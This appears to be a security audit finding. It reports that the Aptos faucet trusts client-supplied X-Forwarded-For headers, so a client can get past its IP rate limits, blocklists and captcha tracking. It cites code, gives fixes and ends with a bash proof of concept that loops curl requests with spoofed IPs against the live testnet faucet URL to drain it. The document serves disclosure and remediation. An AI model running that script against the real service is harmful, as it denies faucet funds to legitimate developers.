# Audit Report

## Title
IP Spoofing via X-Forwarded-For Header Enables Complete Bypass of Faucet Rate Limiting and Security Controls

## Summary
The Aptos faucet service trusts client-controlled HTTP headers (X-Forwarded-For, X-Real-IP) to determine request source IPs, enabling attackers to bypass all IP-based security mechanisms including rate limiting, IP blocklisting, and Google reCAPTCHA verification by spoofing arbitrary IP addresses.

## Finding Description

The faucet service uses the Poem web framework's `RealIp` extractor to determine the source IP address of incoming requests. [1](#0-0)  The code explicitly documents that this extractor parses client-controlled headers: "It takes into things like X-Forwarded-IP and X-Real-IP".

This extracted IP is stored in the `CheckerData` structure [2](#0-1)  and subsequently used across all security checkers:

1. **Google Captcha Verification**: The spoofable `source_ip` is sent to Google's reCAPTCHA API as the `remoteip` parameter [3](#0-2) , allowing attackers to associate different IPs with their captcha solutions and bypass Google's IP-based abuse detection.

2. **Memory-Based Rate Limiting**: The in-memory rate limiter uses `source_ip` as the tracking key [4](#0-3) , enabling unlimited requests by rotating spoofed IPs.

3. **Redis-Based Rate Limiting**: When configured for IP-based rate limiting, Redis checker uses `source_ip.to_string()` as the key [5](#0-4) , suffering the same bypass.

4. **IP Blocklisting**: The blocklist checker validates requests against `source_ip` [6](#0-5) , allowing banned IPs to bypass restrictions.

5. **IP Allowlisting**: The allowlist bypasser grants privileged access based on `source_ip` [7](#0-6) , enabling unauthorized bypass of all security checks.

**Attack Scenario**:
1. Attacker sends request with header: `X-Forwarded-For: 1.1.1.1`
2. Faucet extracts and trusts this IP for all security checks
3. Attacker completes captcha and receives funds, rate limit recorded for `1.1.1.1`
4. Attacker sends next request with header: `X-Forwarded-For: 2.2.2.2`
5. Faucet treats this as a new client, bypassing rate limits entirely
6. Attacker repeats indefinitely, exhausting faucet resources

The vulnerability exists because the `RealIp` extractor prioritizes client-controlled headers (X-Real-IP, X-Forwarded-For) over the actual TCP connection source address. While HAProxy configurations show the `Forwarded` header being added [8](#0-7) , this only *adds* headers rather than *replacing* client-provided ones, and this configuration is for validator nodes, not specifically the faucet deployment.

## Impact Explanation

**Severity: High** (as specified in the security question)

This vulnerability enables:

1. **Complete Rate Limit Bypass**: Attackers can drain testnet/devnet faucets by requesting unlimited funds through IP rotation, denying service to legitimate developers
2. **Security Control Circumvention**: All IP-based security mechanisms (blocklists, allowlists, captcha tracking) become ineffective
3. **Resource Exhaustion**: Faucet token pools can be depleted, causing operational disruption
4. **Abuse Detection Evasion**: Google's reCAPTCHA IP-based abuse detection is bypassed when the service receives spoofed IPs

While testnet tokens have no direct monetary value, this represents a **significant protocol violation** of the faucet service's intended operation and can cause substantial operational impact by denying service to the Aptos developer ecosystem.

## Likelihood Explanation

**Likelihood: Very High**

- **Trivial to exploit**: Requires only setting an HTTP header (achievable with curl, browser extensions, or any HTTP client)
- **No authentication required**: Attack works on the public faucet endpoints
- **No special infrastructure**: Attacker needs only a single IP address to spoof unlimited others
- **Immediate impact**: Each spoofed request bypasses rate limiting immediately
- **Difficult to detect**: Logs will show diverse IP addresses, masking the attack as organic traffic

The attack requires no specialized knowledge beyond basic HTTP header manipulation, making it accessible to any adversarial actor.

## Recommendation

**Immediate Fix**: Extract the real client IP from the TCP connection layer, not from client-controlled headers:

```rust
// In fund.rs preprocess_request function
// Instead of trusting RealIp extractor, use connection remote address
let source_ip = request
    .remote_addr()
    .addr
    .ok_or_else(|| AptosTapError::new(
        "Unable to determine source IP from connection".to_string(),
        AptosTapErrorCode::SourceIpMissing,
    ))?;
```

**If behind trusted reverse proxy**: Configure the reverse proxy to:
1. **Strip** all incoming X-Forwarded-For and X-Real-IP headers from client requests
2. **Add** these headers with the true client IP from the TCP connection
3. **Configure** the faucet to trust only the proxy-added headers

Example HAProxy configuration:
```
http-request del-header X-Forwarded-For
http-request del-header X-Real-IP
http-request set-header X-Forwarded-For %[src]
http-request set-header X-Real-IP %[src]
```

**Defense in depth**:
- Implement additional rate limiting on authenticated identities (JWT/Firebase UID) rather than solely IP-based
- Add CAPTCHA difficulty scaling based on request patterns
- Monitor for suspicious patterns (many unique IPs from same ASN)

## Proof of Concept

```bash
#!/bin/bash
# Exploit: Bypass faucet rate limiting via IP spoofing

FAUCET_URL="https://faucet.testnet.aptoslabs.com/fund"
TARGET_ADDRESS="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

# First request with spoofed IP 1.1.1.1
curl -X POST "$FAUCET_URL" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.1.1.1" \
  -H "COMPLETED_CAPTCHA_TOKEN: <valid_token_1>" \
  -d "{\"address\": \"$TARGET_ADDRESS\", \"amount\": 100000000}"

echo "First request successful with IP 1.1.1.1"

# Second request with spoofed IP 2.2.2.2 (bypasses rate limit)
curl -X POST "$FAUCET_URL" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 2.2.2.2" \
  -H "COMPLETED_CAPTCHA_TOKEN: <valid_token_2>" \
  -d "{\"address\": \"$TARGET_ADDRESS\", \"amount\": 100000000}"

echo "Second request successful with IP 2.2.2.2 - rate limit bypassed!"

# Continue with unlimited IPs...
for i in {3..255}; do
  curl -X POST "$FAUCET_URL" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 3.3.3.$i" \
    -H "COMPLETED_CAPTCHA_TOKEN: <valid_token_$i>" \
    -d "{\"address\": \"$TARGET_ADDRESS\", \"amount\": 100000000}"
  echo "Request $i successful - faucet drained"
done
```

**Expected Result**: All requests succeed despite rate limiting configured for one request per IP, demonstrating complete bypass of IP-based security controls.

## Notes

**Scope Clarification**: While the aptos-faucet is not a core consensus, execution, or governance component, it is production infrastructure within the Aptos ecosystem. The vulnerability represents a significant operational risk to testnet/devnet availability for legitimate developers.

**Cross-Component Impact**: This pattern of trusting client-controlled headers should be audited across all Aptos HTTP services, not just the faucet, as similar vulnerabilities may exist in telemetry services [9](#0-8)  which also extract IPs from X-Forwarded-For headers.

**Deployment Architecture**: The vulnerability's exploitability depends on whether the faucet is deployed behind a properly configured reverse proxy. Based on the codebase analysis, there is no evidence that client-controlled headers are being stripped before reaching the application layer, making this vulnerability actively exploitable in current deployments.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L107-108)
```rust
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/checkers/google_captcha.rs (L80-84)
```rust
            .form::<VerifyRequest>(&VerifyRequest {
                secret: self.config.google_captcha_api_key.0.clone(),
                response: captcha_token.to_string(),
                remoteip: data.source_ip.to_string(),
            })
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L75-78)
```rust
        let mut ip_to_requests_today = self.ip_to_requests_today.lock().await;

        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-46)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
```

**File:** crates/aptos-faucet/core/src/checkers/ip_blocklist.rs (L32-38)
```rust
        match &data.source_ip {
            IpAddr::V4(source_ip) => {
                if self.manager.ipv4_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
```

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L26-28)
```rust
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L102-103)
```text
    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"
```

**File:** crates/aptos-telemetry-service/src/custom_event.rs (L77-80)
```rust
    let client_ip = forwarded_for
        .as_ref()
        .and_then(|xff| xff.split(',').next())
        .unwrap_or("UNKNOWN");
```
